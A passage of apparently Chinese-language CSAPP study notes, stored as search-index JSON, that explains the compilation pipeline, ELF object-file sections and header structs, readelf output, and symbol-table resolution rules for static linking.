\u5df2\u7f16\u8bd1\u7a0b\u5e8f\u7684\u673a\u5668\u7801 .rodata \u53ea\u8bfb\u6570\u636e\uff0c\u5982 printf \u7684 format \u4e32\u3001 switch \u7684\u8df3\u8f6c\u8868 .data \u5df2\u521d\u59cb\u5316\u7684\u5168\u5c40\u548c\u9759\u6001\u53d8\u91cf .bss 3 \u672a\u521d\u59cb\u5316\u6216\u521d\u59cb\u5316\u4e3a 0 \u7684\u5168\u5c40\u548c\u9759\u6001\u53d8\u91cf (better save space) \u2003 \u5728\u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6\u548c\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6\u4e2d\uff0c .bss \u5747\u4e0d\u5360\u5b9e\u9645\u7a7a\u95f4 \u2003 .symtab \u7b26\u53f7\u8868\uff0c\u5b9a\u4e49 & \u5f15\u7528\u7684\u5168\u5c40\u53d8\u91cf\u6216\u51fd\u6570\u7684\u4fe1\u606f .rel.text relocation table of .text .rel.data relocation table of .data .debug ( -g ) \u8c03\u8bd5\u7b26\u53f7\u8868\uff0c\u6761\u76ee\u5305\u62ec\u5c40\u90e8\u53d8\u91cf\u548c\u7c7b\u578b\u5b9a\u4e49\u3001\u5b9a\u4e49\u548c\u5f15\u7528\u7684\u5168\u5c40\u53d8\u91cf\u3001C \u6e90\u6587\u4ef6 .line ( -g ) \u539f\u59cb C \u6e90\u7a0b\u5e8f\u4e2d\u7684\u884c\u53f7\u548c .text \u4e2d\u673a\u5668\u6307\u4ee4\u4e2d\u7684\u6620\u5c04 .strtab \u5b57\u7b26\u4e32\u8868\uff0c\u8868\u4e2d\u7684\u5185\u5bb9\u4f1a\u88ab .symtab \u3001 .debug \u3001section header table \u5f15\u7528 ABS \u4f2a\u8282\uff0c\u4e0d\u8be5\u88ab\u91cd\u5b9a\u4f4d\u7684\u7b26\u53f7 COMMON \u4f2a\u8282\uff0c\u5176\u5b58\u5728\u4e0e\u7b26\u53f7\u89e3\u6790\u65b9\u5f0f\u6709\u5173\uff0c\u6709\u7684\u5b9e\u73b0\u5c06\u5f31\u7b26\u53f7 (\u672a\u521d\u59cb\u5316\u7684\u5168\u5c40\u53d8\u91cf) \u653e\u5728\u8fd9 UNDEF \u4f2a\u8282\uff0c\u672a\u5b9a\u4e49\u7684\u7b26\u53f7 (\u672c\u6a21\u5757\u5f15\u7528\uff0c\u5176\u4ed6\u5730\u65b9\u5b9a\u4e49) \u5c06\u4ee3\u7801\u6bb5\u548c\u6570\u636e\u6bb5\u5206\u5f00\u5b58\u50a8\u7684\u597d\u5904: \u7a0b\u5e8f\u88c5\u8f7d\u540e\uff0c\u6570\u636e\u548c\u6307\u4ee4\u6620\u5c04\u5230\u4e24\u4e2a\u865a\u5b58\u533a\u57df\uff0c\u5bf9\u4e8e\u8fdb\u7a0b\u6570\u636e\u533a\u53ef\u8bfb\u5199\uff0c\u6307\u4ee4\u533a\u53ea\u8bfb\uff0c\u65b9\u4fbf\u6743\u9650\u63a7\u5236 \u6709\u5229\u4e8e\u7a0b\u5e8f\u5c40\u90e8\u6027 \u5f53\u7cfb\u7edf\u4e2d\u8fd0\u884c\u540c\u4e00\u7a0b\u5e8f\u7684\u591a\u4e2a\u526f\u672c\uff0c\u6240\u6709\u53ea\u8bfb\u533a\u53ea\u9700\u8981\u4fdd\u5b58\u4e00\u4efd\uff0c\u8fd9\u662f\u4e00\u4e2a\u5f88\u91cd\u8981\u7684\u6982\u5ff5 3. ELF \u6587\u4ef6\u7ed3\u6784 \ud83e\uddd0 \u2003\u2003\u2003 ELF Sections \u2003\u2003\u2003 \u2003\u2003 Example: \u2002 SimpleSection.c \u2003\u2003 int printf ( const char * format , ...); int global_init_var = 84 ; int global_unit_var ; void func1 ( int i ) { printf ( \"%d \\n \" , i ); } int main ( void ) { static int static_var = 85 ; static int static_var2 ; int a = 1 ; int b ; func1 ( static_var + static_var2 + a + b ); return a ; } (1). ELF Header \ud83e\uddd0 ELF Header \u63cf\u8ff0\u4e86\u6574\u4e2a\u6587\u4ef6\u7684\u57fa\u672c\u5c5e\u6027\uff0c\u4f8b\u5982 Magic Number\u3001\u6587\u4ef6\u7c7b\u578b\u3001\u7a0b\u5e8f\u5165\u53e3\u3001\u6bb5\u8868 Offset \u7b49\u3002 elf.h \u5b9a\u4e49\u4e86\u81ea\u5df1\u7684\u53d8\u91cf\u4f53\u7cfb Elf64_Ehdr typedef struct { unsigned char e_ident [ EI_NIDENT ]; /* Magic number and other info */ Elf64_Half e_type ; /* Object file type */ Elf64_Half e_machine ; /* Architecture */ Elf64_Word e_version ; /* Object file version */ Elf64_Addr e_entry ; /* Entry point virtual address */ Elf64_Off e_phoff ; /* Program header table file offset */ Elf64_Off e_shoff ; /* Section header table file offset */ Elf64_Word e_flags ; /* Processor-specific flags */ Elf64_Half e_ehsize ; /* ELF header size in bytes */ Elf64_Half e_phentsize ; /* Program header table entry size */ Elf64_Half e_phnum ; /* Program header table entry count */ Elf64_Half e_shentsize ; /* Section header table entry size */ Elf64_Half e_shnum ; /* Section header table entry count */ Elf64_Half e_shstrndx ; /* Section header string table index */ } Elf64_Ehdr ; readelf -h $ readelf -h SimpleSection.o ELF \u5934\uff1a Magic\uff1a 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 \u7c7b\u522b: ELF64 \u6570\u636e: 2 \u8865\u7801\uff0c\u5c0f\u7aef\u5e8f (little endian) Version: 1 (current) OS/ABI: UNIX - System V ABI \u7248\u672c: 0 \u7c7b\u578b: REL (\u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6) \u7cfb\u7edf\u67b6\u6784: Advanced Micro Devices X86-64 \u7248\u672c: 0x1 \u5165\u53e3\u70b9\u5730\u5740\uff1a 0x0 \u7a0b\u5e8f\u5934\u8d77\u70b9\uff1a 0 (bytes into file) Start of section headers: 2352 (bytes into file) \u6807\u5fd7\uff1a 0x0 Size of this header: 64 (bytes) Size of program headers: 0 (bytes) Number of program headers: 0 Size of section headers: 64 (bytes) Number of section headers: 21 Section header string table index: 20 ELF \u6587\u4ef6\u6709 32 \u4f4d\u7248\u672c\u548c 64 \u4f4d\u7248\u672c\uff0c\u56e0\u6b64\u5176\u6587\u4ef6\u5934\u4e5f\u6709\u8fd9\u4e24\u79cd\u7248\u672c\u3002 (2). Section Header Table \ud83e\uddd0 \u6bb5\u8868\u63cf\u8ff0\u5404\u4e2a\u6bb5\u7684\u4fe1\u606f\uff0c\u4f8b\u5982 \u6bb5\u540d\u3001\u6bb5\u957f\u3001\u5728\u6587\u4ef6\u4e2d\u7684\u504f\u79fb (\u7d22\u5f15\u5404\u4e2a\u6bb5)\u3001\u8bfb\u5199\u6743\u9650\u7b49\uff0c\u6570\u7ec4\u5143\u7d20\u7684\u7ed3\u6784\uff1a typedef struct { Elf64_Word sh_name ; /* Section name (string tbl index) */ Elf64_Word sh_type ; /* Section type */ Elf64_Xword sh_flags ; /* Section flags */ Elf64_Addr sh_addr ; /* Section virtual addr at execution */ Elf64_Off sh_offset ; /* Section file offset */ Elf64_Xword sh_size ; /* Section size in bytes */ Elf64_Word sh_link ; /* Link to another section */ Elf64_Word sh_info ; /* Additional section information */ Elf64_Xword sh_addralign ; /* Section alignment */ Elf64_Xword sh_entsize ; /* Entry size if section holds table */ } Elf64_Shdr ;","title":"1. object file"},{"location":"_csapp/_Link/object_file/#1","text":"main.c #include <stdio.h> void hello ( void ); int main () { hello (); return 0 ; } hello.c #include <stdio.h> void hello () { printf ( \"hello world!\" ); } compiler driver \u5c06\u6e90\u6587\u4ef6\u7ffb\u8bd1\u4e3a\u53ef\u6267\u884c\u6587\u4ef6\u7684\u8fc7\u7a0b: C \u9884\u5904\u7406\u5668 (cpp) \u5c06\u6e90\u7a0b\u5e8f main.c \u7ffb\u8bd1\u4e3a ascii \u4e2d\u95f4\u6587\u4ef6 main.i C \u7f16\u8bd1\u5668 (cc1) \u5c06 main.i \u7ffb\u8bd1\u4e3a ascii \u6c47\u7f16\u6587\u4ef6 main.s \u6c47\u7f16\u5668 (as) \u5c06 main.s \u7ffb\u8bd1\u4e3a\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6 main.o \u94fe\u63a5\u5668 ld \u5c06\u6240\u6709 .o \u548c\u5fc5\u8981\u7684\u7cfb\u7edf\u76ee\u6807\u6587\u4ef6\u7ed3\u5408\uff0c\u521b\u5efa\u53ef\u6267\u884c\u6587\u4ef6 \u6700\u540e\uff0cshell \u8c03\u7528 loader\uff0c\u5c06\u53ef\u6267\u884c\u6587\u4ef6\u7684\u4ee3\u7801\u548c\u6570\u636e\u590d\u5236\u5230\u5185\u5b58\uff0c\u5e76\u5c06\u63a7\u5236\u8f6c\u79fb\u5230\u5b83\u7684\u5f00\u5934 $ cpp -o ./tmp/main.i main.c $ /usr/lib/gcc/x86_64-pc-linux-gnu/10.2.0/cc1 -o ./tmp/main.s ./tmp/main.i $ as -o ./tmp/main.o ./tmp/main.s $ ld -o prog -dynamic-linker /lib64/ld-linux-x86-64.so.2 /usr/lib/crt1.o /usr/lib/crti.o /usr/lib/crtn.o /usr/lib/libc.so ./tmp/main.o $ ./prog","title":"1. \u7f16\u8bd1\u8fc7\u7a0b"},{"location":"_csapp/_Link/object_file/#2","text":"","title":"2. \u76ee\u6807\u6587\u4ef6"},{"location":"_csapp/_Link/object_file/#1_1","text":"objected files come in three forms: executable object file: \u5f53\u524d\u6d41\u884c\u7684\u683c\u5f0f\u4e3b\u8981\u4e3a Windows \u7684 PE & Linux \u7684 ELF\uff0c\u53ef\u4ee5\u76f4\u63a5\u52a0\u8f7d\u5230\u5185\u5b58\u6267\u884c relocatable object file (Windows: .obj & Linux: .o ): \u7528\u4e8e\u94fe\u63a5\u6210\u53ef\u6267\u884c\u6587\u4ef6\u548c\u5171\u4eab\u76ee\u6807\u6587\u4ef6 shared object file (Windows: .dll & Linux: .so ): \u53ef\u4ee5\u4e0e\u5176\u4ed6\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6/\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u94fe\u63a5\uff0c\u4ea7\u751f\u65b0\u7684\u76ee\u6807\u6587\u4ef6\uff1b\u4e5f\u53ef\u4ee5\u4e0e\u53ef\u6267\u884c\u6587\u4ef6\u7ed3\u5408\uff0c\u4f5c\u4e3a\u8fdb\u7a0b\u6620\u50cf\u7684\u4e00\u90e8\u5206\u8fd0\u884c \u53ef\u6267\u884c\u6587\u4ef6\u683c\u5f0f\u7684\u5386\u53f2 Unix \u6700\u65e9\u7684\u53ef\u6267\u884c\u6587\u4ef6\u683c\u5f0f\u662f a.out\uff0c\u4f46\u7531\u4e8e\u5176\u8bbe\u8ba1\u8fc7\u4e8e\u7b80\u5355\uff0c\u65e0\u6cd5\u9002\u5e94\u5171\u4eab\u5e93\u7684\u6982\u5ff5\uff1bUnix System V Release 3 \u9996\u5148\u63d0\u51fa\u5e76\u4f7f\u7528\u4e86 COFF \u683c\u5f0f\uff0c\u5fae\u8f6f\u57fa\u4e8e COFF \u63d0\u51fa\u4e86 PE \u683c\u5f0f\u6807\u51c6\uff1bSystem V Release 4 \u5f15\u5165\u4e86 ELF \u683c\u5f0f\uff0c\u4e5f\u5c31\u662f\u5f53\u524d Linux \u7684\u53ef\u6267\u884c\u6587\u4ef6\u683c\u5f0f\u3002","title":"(1). \u5206\u7c7b"},{"location":"_csapp/_Link/object_file/#2_1","text":"\u5178\u578b\u7684 ELF \u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6\u5305\u542b\u4ee5\u4e0b section (\u4ee3\u7801\u533a\u3001\u6570\u636e\u533a\u3001\u8f85\u52a9(\u94fe\u63a5/\u8c03\u8bd5)\u533a): section description .text \u5df2\u7f16\u8bd1\u7a0b\u5e8f\u7684\u673a\u5668\u7801 .rodata \u53ea\u8bfb\u6570\u636e\uff0c\u5982 printf \u7684 format \u4e32\u3001 switch \u7684\u8df3\u8f6c\u8868 .data \u5df2\u521d\u59cb\u5316\u7684\u5168\u5c40\u548c\u9759\u6001\u53d8\u91cf .bss 3 \u672a\u521d\u59cb\u5316\u6216\u521d\u59cb\u5316\u4e3a 0 \u7684\u5168\u5c40\u548c\u9759\u6001\u53d8\u91cf (better save space) \u2003 \u5728\u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6\u548c\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6\u4e2d\uff0c .bss \u5747\u4e0d\u5360\u5b9e\u9645\u7a7a\u95f4 \u2003 .symtab \u7b26\u53f7\u8868\uff0c\u5b9a\u4e49 & \u5f15\u7528\u7684\u5168\u5c40\u53d8\u91cf\u6216\u51fd\u6570\u7684\u4fe1\u606f .rel.text relocation table of .text .rel.data relocation table of .data .debug ( -g ) \u8c03\u8bd5\u7b26\u53f7\u8868\uff0c\u6761\u76ee\u5305\u62ec\u5c40\u90e8\u53d8\u91cf\u548c\u7c7b\u578b\u5b9a\u4e49\u3001\u5b9a\u4e49\u548c\u5f15\u7528\u7684\u5168\u5c40\u53d8\u91cf\u3001C \u6e90\u6587\u4ef6 .line ( -g ) \u539f\u59cb C \u6e90\u7a0b\u5e8f\u4e2d\u7684\u884c\u53f7\u548c .text \u4e2d\u673a\u5668\u6307\u4ee4\u4e2d\u7684\u6620\u5c04 .strtab \u5b57\u7b26\u4e32\u8868\uff0c\u8868\u4e2d\u7684\u5185\u5bb9\u4f1a\u88ab .symtab \u3001 .debug \u3001section header table \u5f15\u7528 ABS \u4f2a\u8282\uff0c\u4e0d\u8be5\u88ab\u91cd\u5b9a\u4f4d\u7684\u7b26\u53f7 COMMON \u4f2a\u8282\uff0c\u5176\u5b58\u5728\u4e0e\u7b26\u53f7\u89e3\u6790\u65b9\u5f0f\u6709\u5173\uff0c\u6709\u7684\u5b9e\u73b0\u5c06\u5f31\u7b26\u53f7 (\u672a\u521d\u59cb\u5316\u7684\u5168\u5c40\u53d8\u91cf) \u653e\u5728\u8fd9 UNDEF \u4f2a\u8282\uff0c\u672a\u5b9a\u4e49\u7684\u7b26\u53f7 (\u672c\u6a21\u5757\u5f15\u7528\uff0c\u5176\u4ed6\u5730\u65b9\u5b9a\u4e49) \u5c06\u4ee3\u7801\u6bb5\u548c\u6570\u636e\u6bb5\u5206\u5f00\u5b58\u50a8\u7684\u597d\u5904: \u7a0b\u5e8f\u88c5\u8f7d\u540e\uff0c\u6570\u636e\u548c\u6307\u4ee4\u6620\u5c04\u5230\u4e24\u4e2a\u865a\u5b58\u533a\u57df\uff0c\u5bf9\u4e8e\u8fdb\u7a0b\u6570\u636e\u533a\u53ef\u8bfb\u5199\uff0c\u6307\u4ee4\u533a\u53ea\u8bfb\uff0c\u65b9\u4fbf\u6743\u9650\u63a7\u5236 \u6709\u5229\u4e8e\u7a0b\u5e8f\u5c40\u90e8\u6027 \u5f53\u7cfb\u7edf\u4e2d\u8fd0\u884c\u540c\u4e00\u7a0b\u5e8f\u7684\u591a\u4e2a\u526f\u672c\uff0c\u6240\u6709\u53ea\u8bfb\u533a\u53ea\u9700\u8981\u4fdd\u5b58\u4e00\u4efd\uff0c\u8fd9\u662f\u4e00\u4e2a\u5f88\u91cd\u8981\u7684\u6982\u5ff5","title":"(2). \u683c\u5f0f"},{"location":"_csapp/_Link/object_file/#3-elf","text":"ELF Sections \u2003\u2003\u2003 \u2003\u2003 Example: \u2002 SimpleSection.c \u2003\u2003 int printf ( const char * format , ...); int global_init_var = 84 ; int global_unit_var ; void func1 ( int i ) { printf ( \"%d \\n \" , i ); } int main ( void ) { static int static_var = 85 ; static int static_var2 ; int a = 1 ; int b ; func1 ( static_var + static_var2 + a + b ); return a ; }","title":"3. ELF \u6587\u4ef6\u7ed3\u6784"},{"location":"_csapp/_Link/object_file/#1-elf-header","text":"ELF Header \u63cf\u8ff0\u4e86\u6574\u4e2a\u6587\u4ef6\u7684\u57fa\u672c\u5c5e\u6027\uff0c\u4f8b\u5982 Magic Number\u3001\u6587\u4ef6\u7c7b\u578b\u3001\u7a0b\u5e8f\u5165\u53e3\u3001\u6bb5\u8868 Offset \u7b49\u3002 elf.h \u5b9a\u4e49\u4e86\u81ea\u5df1\u7684\u53d8\u91cf\u4f53\u7cfb Elf64_Ehdr typedef struct { unsigned char e_ident [ EI_NIDENT ]; /* Magic number and other info */ Elf64_Half e_type ; /* Object file type */ Elf64_Half e_machine ; /* Architecture */ Elf64_Word e_version ; /* Object file version */ Elf64_Addr e_entry ; /* Entry point virtual address */ Elf64_Off e_phoff ; /* Program header table file offset */ Elf64_Off e_shoff ; /* Section header table file offset */ Elf64_Word e_flags ; /* Processor-specific flags */ Elf64_Half e_ehsize ; /* ELF header size in bytes */ Elf64_Half e_phentsize ; /* Program header table entry size */ Elf64_Half e_phnum ; /* Program header table entry count */ Elf64_Half e_shentsize ; /* Section header table entry size */ Elf64_Half e_shnum ; /* Section header table entry count */ Elf64_Half e_shstrndx ; /* Section header string table index */ } Elf64_Ehdr ; readelf -h $ readelf -h SimpleSection.o ELF \u5934\uff1a Magic\uff1a 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 \u7c7b\u522b: ELF64 \u6570\u636e: 2 \u8865\u7801\uff0c\u5c0f\u7aef\u5e8f (little endian) Version: 1 (current) OS/ABI: UNIX - System V ABI \u7248\u672c: 0 \u7c7b\u578b: REL (\u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6) \u7cfb\u7edf\u67b6\u6784: Advanced Micro Devices X86-64 \u7248\u672c: 0x1 \u5165\u53e3\u70b9\u5730\u5740\uff1a 0x0 \u7a0b\u5e8f\u5934\u8d77\u70b9\uff1a 0 (bytes into file) Start of section headers: 2352 (bytes into file) \u6807\u5fd7\uff1a 0x0 Size of this header: 64 (bytes) Size of program headers: 0 (bytes) Number of program headers: 0 Size of section headers: 64 (bytes) Number of section headers: 21 Section header string table index: 20 ELF \u6587\u4ef6\u6709 32 \u4f4d\u7248\u672c\u548c 64 \u4f4d\u7248\u672c\uff0c\u56e0\u6b64\u5176\u6587\u4ef6\u5934\u4e5f\u6709\u8fd9\u4e24\u79cd\u7248\u672c\u3002","title":"(1). ELF Header"},{"location":"_csapp/_Link/object_file/#2-section-header-table","text":"\u6bb5\u8868\u63cf\u8ff0\u5404\u4e2a\u6bb5\u7684\u4fe1\u606f\uff0c\u4f8b\u5982 \u6bb5\u540d\u3001\u6bb5\u957f\u3001\u5728\u6587\u4ef6\u4e2d\u7684\u504f\u79fb (\u7d22\u5f15\u5404\u4e2a\u6bb5)\u3001\u8bfb\u5199\u6743\u9650\u7b49\uff0c\u6570\u7ec4\u5143\u7d20\u7684\u7ed3\u6784\uff1a typedef struct { Elf64_Word sh_name ; /* Section name (string tbl index) */ Elf64_Word sh_type ; /* Section type */ Elf64_Xword sh_flags ; /* Section flags */ Elf64_Addr sh_addr ; /* Section virtual addr at execution */ Elf64_Off sh_offset ; /* Section file offset */ Elf64_Xword sh_size ; /* Section size in bytes */ Elf64_Word sh_link ; /* Link to another section */ Elf64_Word sh_info ; /* Additional section information */ Elf64_Xword sh_addralign ; /* Section alignment */ Elf64_Xword sh_entsize ; /* Entry size if section holds table */ } Elf64_Shdr ;","title":"(2). Section Header Table"},{"location":"_csapp/_Link/stlink/","text":"1. \u9759\u6001\u94fe\u63a5\u8fc7\u7a0b \ud83e\uddd0 \u7b26\u53f7\u89e3\u6790: \u2002 \u5173\u8054\u8de8\u6a21\u5757\u7b26\u53f7\u7684\u5f15\u7528\u548c\u5b9a\u4e49\uff0c\u4e3a\u91cd\u5b9a\u4f4d\u4f5c\u94fa\u57ab \u91cd\u5b9a\u4f4d: \u6a21\u5757\u7f16\u8bd1\u751f\u6210 _.o \u65f6\uff0c\u7531\u4e8e\u4e0d\u77e5\u9053\u8fd0\u884c\u65f6\u7684\u4ee3\u7801\u6bb5\u548c\u6570\u636e\u6bb5\u7684\u5730\u5740\uff0c\u6a21\u5757\u5185\u6bcf\u5f15\u7528\u4e00\u4e2a\u5168\u5c40\u7b26\u53f7 (\u81ea\u5df1\u5b9a\u4e49\u7684\u4e5f\u7b97)\uff0c\u5c31\u751f\u6210\u4e00\u4e2a\u91cd\u5b9a\u4f4d\u6761\u76ee .rel._ (\u5148\u7559\u5751\u5e76\u5b58\u70b9\u6709\u6548\u4fe1\u606f\uff0c\u7b49\u586b) \u94fe\u63a5\u65f6\uff0c\u5148\u5408\u5e76\u6240\u6709\u7684\u8282\uff0c\u7136\u540e\u628a\u5730\u5740\u8d4b\u7ed9\u6bcf\u4e2a\u5408\u5e76\u540e\u7684\u8282\u3001\u8f93\u5165\u6a21\u5757\u5b9a\u4e49\u7684\u6240\u6709\u7b26\u53f7\uff0c\u6b64\u65f6\u91cd\u5b9a\u4f4d\u4fe1\u606f\u5df2\u7ecf\u5b8c\u6574 (\u8282\u5730\u5740\u3001\u51fd\u6570\u548c\u53d8\u91cf\u7684\u5730\u5740\u90fd\u77e5\u9053\u4e86)\uff0c\u6839\u636e\u91cd\u5b9a\u4f4d\u6761\u76ee\u6267\u884c\u91cd\u5b9a\u4f4d 2. \u7b26\u53f7\u89e3\u6790 \ud83e\uddd0 (1). \u7b26\u53f7\u8868 \ud83e\uddd0 .symtab \u662f Elf64_Sym \u7684\u6570\u7ec4\uff0c\u5176\u6210\u5458\u5982\u4e0b typedef struct { Elf64_Word st_name ; /* Symbol name (string tbl index) */ unsigned char st_info ; /* Symbol type and binding */ unsigned char st_other ; /* Symbol visibility */ Elf64_Section st_shndx ; /* Section index */ Elf64_Addr st_value ; /* Symbol value */ Elf64_Xword st_size ; /* Symbol size */ } Elf64_Sym ; meaning of members st_name : \u2002 \u7b26\u53f7\u540d\uff0c\u5305\u542b\u4e86\u7b26\u53f7\u5728\u5b57\u7b26\u4e32\u8868\u7684\u4e0b\u6807 st_value : \u2002 \u7b26\u53f7\u503c\u3002\u5bf9\u4e8e\u53ef\u6267\u884c\u6587\u4ef6\u548c\u5171\u4eab\u6587\u4ef6\uff0c\u5176\u503c\u4ee3\u8868\u8fd0\u884c\u65f6\u5730\u5740\uff1b\u5bf9\u4e8e\u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6\u4e14 shndx \u6709\u6548\u7684\u6761\u76ee\uff0c\u5176\u503c\u4ee3\u8868\u6bb5\u504f\u79fb st_size : \u2002 \u7b26\u53f7\u5927\u5c0f\uff0c\u4f8b\u5982 double \u578b\u7684\u7b26\u53f7\u5360 8 \u5b57\u8282 st_info : \u2002 \u7b26\u53f7\u7c7b\u578b\u548c\u7ed1\u5b9a\u4fe1\u606f\uff0c\u4f4e 4 \u4f4d\u662f symbol type\uff0c\u9ad8 28 \u4f4d\u662f symbol binding st_other : \u2002 \u4e3a 0, \u6ca1\u7528 st_shndx : \u2002 \u7b26\u53f7\u6240\u5728\u7684\u6bb5\u3002\u5982\u679c\u7b26\u53f7\u5b9a\u4e49\u5728\u672c\u76ee\u6807\u6587\u4ef6\u4e2d\uff0c\u90a3\u4e48\u6b64\u6210\u5458\u8868\u793a\u7b26\u53f7\u6240\u5728\u7684\u6bb5\u5728\u6bb5\u8868\u4e2d\u7684\u4e0b\u6807\uff0c\u5426\u5219\u4e3a\u7279\u6b8a\u503c st_info (symbol type) macro value description STT_NOTYPE 0 \u672a\u77e5\u7c7b\u578b\u7b26\u53f7 STT_OBJECT 1 \u6570\u636e\u5bf9\u8c61\uff0c\u4f8b\u5982 \u53d8\u91cf\u3001\u6570\u7ec4 STT_FUNC 2 \u51fd\u6570\u6216\u5176\u4ed6\u53ef\u6267\u884c\u4ee3\u7801 STT_SECTION 3 \u4e00\u4e2a\u6bb5\uff0c\u4e00\u5b9a\u662f\u662f STB_LOCAL STT_FILE 4 \u6587\u4ef6\u540d\uff0c\u4e00\u5b9a\u662f STB_LOCAL \uff0c st_shndx \u4e00\u5b9a\u662f SHN_ABS st_info (symbol binding) macro value description STB_LOCAL 0 \u5c40\u90e8\u7b26\u53f7\uff0c\u6587\u4ef6\u5916\u4e0d\u53ef\u89c1 STB_GLOBAL 1 \u5168\u5c40\u5f3a\u7b26\u53f7 STB_WEAK 2 \u5f31\u7b26\u53f7 st_shndx (special value) macro value description SHN_ABS 0xfff1 \u8868\u793a\u8be5\u7b26\u53f7\u5305\u542b\u4e86\u4e00\u4e2a\u7edd\u5bf9\u7684\u503c SHN_COMMON 0xfff2 COMMON \u7c7b\u578b\u7684\u7b26\u53f7 SHN_UNDEF 0 \u8868\u793a\u8be5\u7b26\u53f7\u672a\u5b9a\u4e49 (\u672c\u6587\u4ef6\u5f15\u7528\uff0c\u5176\u4ed6\u6587\u4ef6\u5b9a\u4e49) (2). \u7b26\u53f7\u5206\u7c7b\u4e0e\u7ed1\u5b9a \ud83e\uddd0 \u6bcf\u4e2a\u76ee\u6807\u6a21\u5757\u90fd\u6709\u4e00\u4e2a\u7b26\u53f7\u8868\uff0c\u5728 linker \u7684\u4e0a\u4e0b\u6587\u4e2d\uff0c\u6709\u4e09\u79cd\u7b26\u53f7: \u672c\u6a21\u5757\u5b9a\u4e49\u7684\u5168\u5c40\u7b26\u53f7 (\u975e\u9759\u6001\u51fd\u6570 \u548c \u5168\u5c40\u53d8\u91cf) \u5176\u4ed6\u6a21\u5757\u5b9a\u4e49, \u88ab\u672c\u6a21\u5757\u5f15\u7528\u7684\u5168\u5c40\u7b26\u53f7 \u53ea\u88ab\u672c\u6a21\u5757\u5b9a\u4e49\u548c\u5f15\u7528\u7684\u5c40\u90e8\u7b26\u53f7 (\u9759\u6001\u51fd\u6570 \u548c \u9759\u6001\u5168\u5c40\u53d8\u91cf) \u7f16\u8bd1\u65f6\uff0c\u7f16\u8bd1\u5668\u5411\u6c47\u7f16\u5668\u8f93\u51fa\u5168\u5c40\u7b26\u53f7\u53ca\u5176\u5f3a\u5f31\u4fe1\u606f\uff0c\u6c47\u7f16\u5668\u628a\u8fd9\u4e2a\u4fe1\u606f\u7f16\u7801\u5728\u7b26\u53f7\u8868\u4e2d strong: \u2002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u6a21\u5757\u4e2d\u6240\u6709\u7b26\u53f7\u90fd\u662f\u5f3a\u7b26\u53f7 weak: \u2002 \u9700\u8981\u989d\u5916\u5b9a\u4e49 Linux \u94fe\u63a5\u5668\u6784\u9020\u5168\u5c40\u7b26\u53f7\u8868\uff0c\u6839\u636e\u5982\u4e0b\u89c4\u5219\u5904\u7406\u591a\u91cd\u5b9a\u4e49\u7684\u7b26\u53f7: Rule 1: \u2002 \u4e0d\u5141\u8bb8\u6709\u591a\u4e2a\u540c\u540d\u7684\u5f3a\u7b26\u53f7 Rule 2: \u2002 \u5982\u679c\u6709\u4e00\u4e2a\u5f3a\u7b26\u53f7\u548c\u591a\u4e2a\u5f31\u7b26\u53f7\u540c\u540d\uff0c\u9009\u62e9\u5f3a\u7b26\u53f7 Rule 3: \u2002 \u5982\u679c\u6709\u591a\u4e2a\u5f31\u7b26\u53f7\u540c\u540d\uff0c\u4ece\u4e2d\u4efb\u9009\u4e00\u4e2a C static C static \u53d8\u91cf\u4f7f\u7528\u7684\u573a\u666f \u5e0c\u671b\u67d0\u4e2a\u5168\u5c40\u53d8\u91cf\u53ea\u5728\u5f53\u524d\u6a21\u5757\u53ef\u8bbf\u95ee \u51fd\u6570\u5e0c\u671b\u4f7f\u7528\u4e00\u4e2a\u53ef\u4ee5\u4fdd\u7559\u72b6\u6001\u7684\u5c40\u90e8\u53d8\u91cf (\u4e0d\u5728\u6808\u4e0a)\uff0c\u53c8\u4e0d\u5e0c\u671b\u5168\u5c40\u8bbf\u95ee static \u53d8\u91cf\u9700\u8981 .bss \u6216 .data \u4e0a\u7684\u7a7a\u95f4\uff0c\u56e0\u6b64\u653e\u5728 .symtab \u4e2d\u3002\u4f46\u4e0d\u540c\u51fd\u6570\u53ef\u80fd\u5b9a\u4e49\u540c\u540d\u7684\u5c40\u90e8\u9759\u6001\u53d8\u91cf\uff0c\u7b26\u53f7\u8868\u901a\u5e38\u4ee5 x.0 , x.1 \u7684\u65b9\u5f0f\u533a\u5206 int f () { static int a = 10 ; } int g () { static int a = 20 ; } // readelf -s __.o : a.0, a.1 \u5f31\u7b26\u53f7\u673a\u5236\u7684\u4f5c\u7528 \u5f53\u524d\u6a21\u5757\u9700\u8981\u8c03\u8bd5\uff0c\u800c\u5176\u4ed6\u76f8\u5173\u6a21\u5757\u8fd8\u672a\u5b9e\u73b0\uff0c\u5148\u5b9a\u4e49\u5f31\u53d8\u91cf\u6216\u5f31\u51fd\u6570\u8fdb\u884c\u8c03\u8bd5 \u5e93\u4e2d\u7684\u67d0\u4e2a\u51fd\u6570\u5b9a\u4e49\u4e3a\u5f31\u7b26\u53f7\uff0c\u652f\u6301\u4f7f\u7528\u8005\u8986\u76d6 COMMON\u2002mechanism \u5bf9\u4e8e\u5f31\u7b26\u53f7\uff0c\u53ef\u4ee5 binding = weak, ndx = .bss \uff0c\u4e5f\u53ef\u4ee5 binding = global, ndx = COM \uff0c\u540e\u8005\u76f8\u5f53\u4e8e common \u5c31\u662f\u5f31\u6807\u8bb0\uff0c\u5728\u5408\u6210\u53ef\u6267\u884c\u6587\u4ef6\u65f6\u90fd\u53ef\u4ee5\u89e3\u6790\uff0c\u53d6\u51b3\u4e8e\u5177\u4f53\u5b9e\u73b0 COMMON \u6bb5\u548c .bss \u529f\u80fd\u6709\u70b9\u50cf\uff0c\u4f46 COMMON \u7684\u521d\u8877\u662f\u89e3\u51b3\u5f31\u7b26\u53f7\u91cd\u540d\uff0c\u7eaf\u662f\u5386\u53f2\u539f\u56e0 here /* test with gcc 10.2 & readelf */ double x __attribute__ (( 